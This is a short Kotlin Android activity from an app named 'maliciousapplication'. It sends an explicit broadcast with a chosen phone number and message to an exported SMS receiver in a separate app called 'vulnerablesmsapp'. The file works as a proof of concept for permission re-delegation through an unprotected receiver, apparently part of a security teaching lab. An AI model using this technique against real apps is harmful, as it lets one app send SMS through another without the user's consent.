package com.example.maliciousapplication

import android.content.ComponentName
import android.content.ContentValues
import android.content.Intent
import android.os.Bundle
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import kotlinx.android.synthetic.main.activity_broadcast.*
import kotlinx.android.synthetic.main.activity_main.*

class BroadcastActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_broadcast)
    }

    fun sendMessage(view: View) {
        Log.e("startingSMS", "sending broadcast")
        val intent = Intent()
        intent.action = "sendSMSBroadcast"
        intent.putExtra("number", text_field_number.editText?.text.toString())
        intent.putExtra("message", text_field_message.editText?.text.toString())
        intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
        intent.component = ComponentName("com.example.vulnerablesmsapp", "com.example.vulnerablesmsapp.SendSMSBroadcastReceiver")
        sendBroadcast(intent)
    }
}